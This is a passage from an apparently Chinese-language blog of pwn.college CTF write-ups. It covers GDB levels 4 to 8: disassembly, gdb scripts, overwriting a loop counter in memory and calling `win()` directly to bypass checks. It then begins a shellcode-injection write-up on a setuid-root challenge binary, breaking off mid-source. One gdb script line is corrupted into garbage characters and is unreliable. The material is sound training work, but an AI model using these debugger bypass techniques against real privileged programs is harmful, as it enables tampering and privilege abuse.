_puts<br><span class="hljs-symbol">.text:</span>0000000000001C5A                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aAGoodInternalU <span class="hljs-comment">; &quot;a good internal understanding of these &quot;...</span><br><span class="hljs-symbol">.text:</span>0000000000001C61                 <span class="hljs-keyword">call</span>    _puts<br><span class="hljs-symbol">.text:</span>0000000000001C66                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aExecution <span class="hljs-comment">; &quot;execution.\n&quot;</span><br><span class="hljs-symbol">.text:</span>0000000000001C6D                 <span class="hljs-keyword">call</span>    _puts<br><span class="hljs-symbol">.text:</span>0000000000001C72                 <span class="hljs-keyword">int</span>     <span class="hljs-number">3</span>               <span class="hljs-comment">; Trap to Debugger</span><br><span class="hljs-symbol">.text:</span>0000000000001C72 main            endp<br><span class="hljs-symbol">.text:</span>0000000000001C72<br><span class="hljs-symbol">.text:</span>0000000000001C72 <span class="hljs-comment">; ---------------------------------------------------------------------------</span><br><span class="hljs-symbol">.text:</span>0000000000001C73                 <span class="hljs-meta">align</span> <span class="hljs-number">4</span><br><span class="hljs-symbol">.text:</span>0000000000001C74                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">1Ch</span>], <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span>0000000000001C7B                 <span class="hljs-keyword">jmp</span>     loc_1D2B<br><span class="hljs-symbol">.text:</span>0000000000001C80 <span class="hljs-comment">; ---------------------------------------------------------------------------</span><br><span class="hljs-symbol">.text:</span>0000000000001C80<br><span class="hljs-symbol">.text:</span>0000000000001C80 loc_1C80:                               <span class="hljs-comment">; CODE XREF: .text:0000000000001D2F↓j</span><br><span class="hljs-symbol">.text:</span>0000000000001C80                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">esi</span>, <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span>0000000000001C85                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aDevUrandom <span class="hljs-comment">; &quot;/dev/urandom&quot;</span><br><span class="hljs-symbol">.text:</span>0000000000001C8C                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span>0000000000001C91                 <span class="hljs-keyword">call</span>    _open<br><span class="hljs-symbol">.text:</span>0000000000001C96                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">ecx</span>, <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span>0000000000001C98                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">18h</span>]<br><span class="hljs-symbol">.text:</span>0000000000001C9C                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-number">8</span><br><span class="hljs-symbol">.text:</span>0000000000001CA1                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rax</span><br><span class="hljs-symbol">.text:</span>0000000000001CA4                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edi</span>, <span class="hljs-built_in">ecx</span><br><span class="hljs-symbol">.text:</span>0000000000001CA6                 <span class="hljs-keyword">call</span>    _read<br><span class="hljs-symbol">.text:</span>0000000000001CAB                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aTheRandomValue <span class="hljs-comment">; &quot;The random value has been set!\n&quot;</span><br><span class="hljs-symbol">.text:</span>0000000000001CB2                 <span class="hljs-keyword">call</span>    _puts<br><span class="hljs-symbol">.text:</span>0000000000001CB7                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aRandomValue <span class="hljs-comment">; &quot;Random value: &quot;</span><br><span class="hljs-symbol">.text:</span>0000000000001CBE                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span>0000000000001CC3                 <span class="hljs-keyword">call</span>    _printf<br><span class="hljs-symbol">.text:</span>0000000000001CC8                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">10h</span>]<br><span class="hljs-symbol">.text:</span>0000000000001CCC                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rax</span><br><span class="hljs-symbol">.text:</span>0000000000001CCF                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aLlx       <span class="hljs-comment">; &quot;%llx&quot;</span><br><span class="hljs-symbol">.text:</span>0000000000001CD6                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span>0000000000001CDB                 <span class="hljs-keyword">call</span>    ___isoc99_scanf<br><span class="hljs-symbol">.text:</span>0000000000001CE0                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">10h</span>]<br><span class="hljs-symbol">.text:</span>0000000000001CE4                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rax</span><br><span class="hljs-symbol">.text:</span>0000000000001CE7                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aYouInputLlx <span class="hljs-comment">; &quot;You input: %llx\n&quot;</span><br><span class="hljs-symbol">.text:</span>0000000000001CEE                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span>0000000000001CF3                 <span class="hljs-keyword">call</span>    _printf<br><span class="hljs-symbol">.text:</span>0000000000001CF8                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">18h</span>]<br><span class="hljs-symbol">.text:</span>0000000000001CFC                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rax</span><br><span class="hljs-symbol">.text:</span>0000000000001CFF                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aTheCorrectAnsw <span class="hljs-comment">; &quot;The correct answer is: %llx\n&quot;</span><br><span class="hljs-symbol">.text:</span>0000000000001D06                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span>0000000000001D0B                 <span class="hljs-keyword">call</span>    _printf<br><span class="hljs-symbol">.text:</span>0000000000001D10                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdx</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">10h</span>]<br><span class="hljs-symbol">.text:</span>0000000000001D14                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">18h</span>]<br><span class="hljs-symbol">.text:</span>0000000000001D18                 <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">rax</span><br><span class="hljs-symbol">.text:</span>0000000000001D1B                 <span class="hljs-keyword">jz</span>      short loc_1D27<br><span class="hljs-symbol">.text:</span>0000000000001D1D                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edi</span>, <span class="hljs-number">1</span><br><span class="hljs-symbol">.text:</span>0000000000001D22                 <span class="hljs-keyword">call</span>    _exit<br><span class="hljs-symbol">.text:</span>0000000000001D27 <span class="hljs-comment">; ---------------------------------------------------------------------------</span><br><span class="hljs-symbol">.text:</span>0000000000001D27<br><span class="hljs-symbol">.text:</span>0000000000001D27 loc_1D27:                               <span class="hljs-comment">; CODE XREF: .text:0000000000001D1B↑j</span><br><span class="hljs-symbol">.text:</span>0000000000001D27                 <span class="hljs-keyword">add</span>     <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">1Ch</span>], <span class="hljs-number">1</span><br><span class="hljs-symbol">.text:</span>0000000000001D2B<br><span class="hljs-symbol">.text:</span>0000000000001D2B loc_1D2B:                               <span class="hljs-comment">; CODE XREF: .text:0000000000001C7B↑j</span><br><span class="hljs-symbol">.text:</span>0000000000001D2B                 <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">1Ch</span>], <span class="hljs-number">3</span><br><span class="hljs-symbol">.text:</span>0000000000001D2F                 <span class="hljs-keyword">jle</span>     loc_1C80<br><span class="hljs-symbol">.text:</span>0000000000001D35                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span>0000000000001D3A                 <span class="hljs-keyword">call</span>    win<br></code></pre></td></tr></table></figure><p>有一个跳转，会和3比较，小于等于3则跳回去，重复验证输入是不是正确</p><p>也就是for(i=0;i&lt;=3;i++)</p><p>三次都对即可（相当于三次level 3 ）</p><h1 id="5"><a href="#5" class="headerlink" title="5"></a>5</h1><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">虽然像我们在过去的级别中所做的那样交互地使用gdb非常强大，但另一个强大的工具是gdb脚本。通过编写gdb脚本，您可以快速创建一个定制的程序分析工具。如果您知道如何与gdb进行交互，那么您已经知道如何编写gdb脚本——语法完全相同。您可以将命令写入某个文件，例如`x.gdb`，然后使用标志`-x &lt;PATH_TO_SCRIPT&gt;`启动gdb。这个文件将在gdb启动后执行所有的gdb命令。或者，您可以使用`-ex &#x27;&lt;COMMAND&gt;&#x27;`执行单个命令。您可以使用多个`-ex`参数传递多个命令。最后，您可以将一些命令放在`~/.gdbinit`中，以便在任何gdb会话中始终执行。您可能希望在其中放入`set disassembly-flavor intel`。<br><br>在gdb脚本中，一个非常强大的结构是断点命令。考虑以下gdb脚本：<br><br>start  <br><span class="hljs-keyword">break</span> *main+<span class="hljs-number">42</span>  <br>commands  <br>x/gx $rbp-<span class="hljs-number">0</span>x32  <br><span class="hljs-keyword">continue</span>  <br>end  <br><span class="hljs-keyword">continue</span><br><br>在这种情况下，每当我们到达`main+<span class="hljs-number">42</span>`处的指令时，我们将输出一个特定的局部变量，然后继续执行。<br><br>现在考虑一个类似但稍微更高级的脚本，其中使用了一些您尚未见过的命令：<br><br>start  <br><span class="hljs-keyword">break</span> *main+<span class="hljs-number">42</span>  <br>commands  <br>silent  <br>set �������������=∗(����������������∗)(localv​ariable=∗(unsignedlonglong∗)(rbp-<span class="hljs-number">0</span>x32)  <br>printf <span class="hljs-string">&quot;当前值：%llx\n&quot;</span>, $local_variable  <br><span class="hljs-keyword">continue</span>  <br>end  <br><span class="hljs-keyword">continue</span><br><br>在这种情况下，`silent`表示我们不希望gdb报告我们已经触发了一个断点，以使输出更清晰。然后我们使用`set`命令在gdb会话中定义一个变量，其值为我们的局部变量。最后，我们使用格式化字符串输出当前值。<br><br>使用gdb脚本来帮助您收集随机值。<br></code></pre></td></tr></table></figure><p>open 打开/dev/urandom的文件描述符，返回描述符</p><p>read读取描述符所在位置的值写到缓冲区中，缓冲区位置在<code>$rbp-0x18</code></p><p>scanf两个参数，第一个是 “llx”，第二个是<code>$rbp-0x10</code></p><p>在main+752处打断点</p><p>display用法：</p><ul><li>display/10i $rip<ul><li>每次gdb停止都会打印出接下来的十条指令</li></ul></li><li>info display<ul><li>查看目前有多少个display</li></ul></li><li>undisplay</li></ul><p>layout asm和layout regs的窗口绘制有问题，所以不如用display指令</p><p>题干给的gdb脚本，一直没搞懂怎么在二进制中自动调用的gdb窗口中使用和交互，这类还是用最基本的方法，让程序使用display自动输出值，复制粘贴作为scanf的输入</p><ul><li><code>b *main+752</code></li><li>run</li><li><code>(gdb) display /10i $rip</code></li><li><code>(gdb) display/xg $rbp-0x18</code><ul><li><code>x/gx $rbp-0x18</code></li></ul></li><li>输入值</li><li>c</li></ul><p>这一次和上一次相比，循环次数变成了7，因此如果每一次都是手动打命令，非常容易出错。display可以帮助我们</p><h1 id="6"><a href="#6" class="headerlink" title="6"></a>6</h1><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs arduino">GDB是一个非常强大的动态分析工具，可以帮助你了解程序在执行过程中的状态。在本模块中，你将熟悉一些gdb的功能。<br><br>事实证明，gdb对目标进程具有完全的控制权。你不仅可以分析程序的状态，还可以修改它。尽管gdb可能不是长期维护程序的最佳工具，但有时候为了更容易分析目标进程，快速修改其行为可能会很有用。<br><br>你可以使用`set`命令来修改目标程序的状态。例如，你可以使用`set $rdi = <span class="hljs-number">0</span>`将 `$rdi` 寄存器置为<span class="hljs-number">0</span>。你可以使用 `set *((<span class="hljs-keyword">uint64_t</span> *) $rsp) = <span class="hljs-number">0x1234</span>` 将栈上的第一个值设置为<span class="hljs-number">0x1234</span>。你可以使用 `set *((<span class="hljs-keyword">uint16_t</span> *) <span class="hljs-number">0x31337000</span>) = <span class="hljs-number">0x1337</span>` 将地址为<span class="hljs-number">0x31337000</span>的两个字节设置为<span class="hljs-number">0x1337</span>。<br><br>假设你的目标是一个网络应用程序，它从文件描述符<span class="hljs-number">42</span>上读取数据。也许为了分析方便，你希望目标改为从标准输入(stdin)读取。你可以使用以下gdb脚本实现这样的功能：<br><br>start<br><span class="hljs-keyword">catch</span> syscall read<br>commands<br>  silent<br>  <span class="hljs-keyword">if</span> ($rdi == <span class="hljs-number">42</span>)<br>    set $rdi = <span class="hljs-number">0</span><br>  end<br>  <span class="hljs-keyword">continue</span><br>end<br><span class="hljs-keyword">continue</span><br><br>这个示例gdb脚本演示了如何自动在系统调用上设置断点，并如何在命令中使用条件来有条件地执行gdb命令。<br><br>在上一级中，你的gdb脚本解决方案可能仍然需要你复制和粘贴解决方案。这一次，尝试编写一个脚本，不需要与程序进行交互，而是通过正确修改寄存器和内存来自动解决每个挑战。<br></code></pre></td></tr></table></figure><p>一直在如何和gdb交互，跳过scanf函数、达到和scanf相同的效果上搞事情了，结果越想越复杂</p><p>但是其实如果只是想要flag，可以直接修改内存的值，也即是说，将和0x3F对比的那个循环条件的内存的值修改为一个较大的值</p><p><code>set *(int*)($rbp-0x1c) = 100</code></p><h1 id="7"><a href="#7" class="headerlink" title="7"></a>7</h1><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">GDB是一个非常强大的动态分析工具，您可以使用它来了解程序在执行过程中的状态。在本模块中，您将熟悉一些GDB的功能。<br><br>正如我们在前一个级别中演示的那样，GDB对目标进程具有完全控制权。在正常情况下，作为普通用户运行的GDB无法附加到特权进程。这就是为什么GDB不是一个巨大的安全问题，不会让您立即解决所有级别的原因。尽管如此，GDB仍然是一个非常强大的工具。<br><br>在这个提升的GDB实例中运行，您将对整个系统拥有更高的控制权。为了清楚地证明这一点，试试运行命令`call (void)win()`会发生什么。事实证明，这个模块中的所有级别都可以用这种方式解决。<br><br>GDB非常强大！<br></code></pre></td></tr></table></figure><p>直接调用win</p><p>call (void)win()</p><h1 id="8"><a href="#8" class="headerlink" title="8"></a>8</h1><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">GDB是一个非常强大的动态分析工具，可以帮助你了解程序在执行过程中的状态。在本模块中，你将熟悉一些gdb的功能。<br><br>正如我们在前一个级别中演示的那样，gdb对目标进程具有完全控制权。在正常情况下，以你常规用户身份运行的gdb无法附加到特权进程。这就是为什么gdb不是一个允许你立即解决所有级别的严重安全问题。尽管如此，gdb仍然是一个非常强大的工具。<br><br>在这个提升的gdb实例中运行，你可以对整个系统拥有更高的控制权。为了清楚地证明这一点，看看当你运行命令 `call (void)win()` 时会发生什么。<br><br>请注意，这不会给你带来标志（似乎我们破坏了win函数！），所以你需要更加努力才能获得这个标志！<br><br>事实证明，本模块的所有其他级别都可以用这种方式解决。<br><br>GDB非常强大！<br></code></pre></td></tr></table></figure><p>看一下win函数，把0赋值给rax，然后取0地址指向的值，这造成指针引用错误</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001951</span> win             proc <span class="hljs-built_in">near</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001951</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001951</span> var_8           = <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> -<span class="hljs-number">8</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001951</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001951</span> <span class="hljs-comment">; __unwind &#123;</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001951</span>                 endbr64<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001955</span>                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">rbp</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001956</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rbp</span>, <span class="hljs-built_in">rsp</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001959</span>                 <span class="hljs-keyword">sub</span>     <span class="hljs-built_in">rsp</span>, <span class="hljs-number">10h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000000195D</span>                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">rbp</span>+var_8], <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001965</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rbp</span>+var_8]<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001969</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">rax</span>]<br><span class="hljs-symbol">.text:</span>000000000000196B                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">edx</span>, [<span class="hljs-built_in">rax</span>+<span class="hljs-number">1</span>]<br><span class="hljs-symbol">.text:</span>000000000000196E                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rbp</span>+var_8]<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001972</span>                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">rax</span>], <span class="hljs-built_in">edx</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001974</span>                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aYouWinHereIsYo <span class="hljs-comment">; &quot;You win! Here is your flag:&quot;</span><br><span class="hljs-symbol">.text:</span>000000000000197B                 <span class="hljs-keyword">call</span>    _puts<br></code></pre></td></tr></table></figure><p>解决方法：直接调用win函数，然后单步执行，如果遇到对0解引用就修改使其不为0</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>pwn college 刷题记录： Shellcode Injection</title>
    <link href="/p/78594644/"/>
    <url>/p/78594644/</url>
    
    <content type="html"><![CDATA[<p>shellcode，我的 shellcode 🥵</p><span id="more"></span><p><img src="/image/pwn-college.png"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>shellcode，我的 shellcode - 🥵</p><h1 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h1><ul><li><a href="https://x64.syscall.sh/">x64.syscall.sh</a>: Your cheat sheet for syscalls. A glance here, and you’re always ahead.<br>  x64.syscall.sh：系统调用的备忘单</li><li><a href="https://man7.org/linux/man-pages/man2/syscalls.2.html">Syscalls Manpage</a>: Understand not just the calls, but their deeper implications.<br>  Syscalls Manpage：不仅了解调用，还了解其更深层次的含义。</li><li><a href="https://www.felixcloutier.com/x86/">Felix Cloutier</a>: Dive into the heartbeats of instructions, ensuring you’re always in step.<br>  Felix Cloutier：深入了解指令的脉动，确保您始终步调一致。</li><li><a href="http://ref.x86asm.net/coder64.html">x86asm Reference</a>: Decode the bytes into moves, turning the tables on any challenge.<br>  x86asm 参考：将字节解码为移动，在任何挑战中扭转局面。</li></ul><h1 id="1"><a href="#1" class="headerlink" title="1"></a>1</h1><p>看一下题版文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ ll <span class="hljs-regexp">/challenge/</span>babyshell_level1<br>-rwsr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">17531</span> Oct  <span class="hljs-number">4</span>  <span class="hljs-number">2023</span> <span class="hljs-regexp">/challenge/</span>babyshell_level1*<br></code></pre></td></tr></table></figure><p>属于是suid 程序</p><p>看一下程序逻辑</p><ul><li>分配一块内存用于存放shellcode，其大小为0x1000字节</li><li>从标准输入读取最多0x1000字节的数据到shellcode区域</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;assert.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;capstone/capstone.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> CAPSTONE_ARCH CS_ARCH_X86</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> CAPSTONE_MODE CS_MODE_64</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">print_disassembly</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *shellcode_addr, <span class="hljs-keyword">size_t</span> shellcode_size)</span></span><br><span class="hljs-function"></span>&#123;<br>    csh handle;<br>    cs_insn *insn;<br>    <span class="hljs-keyword">size_t</span> count;<br><br>    <span class="hljs-keyword">if</span> (cs_open(CAPSTONE_ARCH, CAPSTONE_MODE, &amp;handle) != CS_ERR_OK)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ERROR: disassembler failed to initialize.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    count = cs_disasm(handle, shellcode_addr, shellcode_size, (<span class="hljs-keyword">uint64_t</span>)shellcode_addr, <span class="hljs-number">0</span>, &amp;insn);<br>    <span class="hljs-keyword">if</span> (count &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-keyword">size_t</span> j;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;      Address      |                      Bytes                    |          Instructions\n&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;------------------------------------------------------------------------------------------\n&quot;</span>);<br><br>        <span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; count; j++)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0x%016lx | &quot;</span>, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)insn[j].address);<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> k = <span class="hljs-number">0</span>; k &lt; insn[j].size; k++) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%02hhx &quot;</span>, insn[j].bytes[k]);<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> k = insn[j].size; k &lt; <span class="hljs-number">15</span>; k++) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;   &quot;</span>);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; | %s %s\n&quot;</span>, insn[j].mnemonic, insn[j].op_str);<br>        &#125;<br><br>        cs_free(insn, count);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ERROR: Failed to disassemble shellcode! Bytes are:\n\n&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;      Address      |                      Bytes\n&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;--------------------------------------------------------------------\n&quot;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt;= shellcode_size; i += <span class="hljs-number">16</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0x%016lx | &quot;</span>, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)shellcode_addr+i);<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">16</span>; k++) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%02hhx &quot;</span>, ((<span 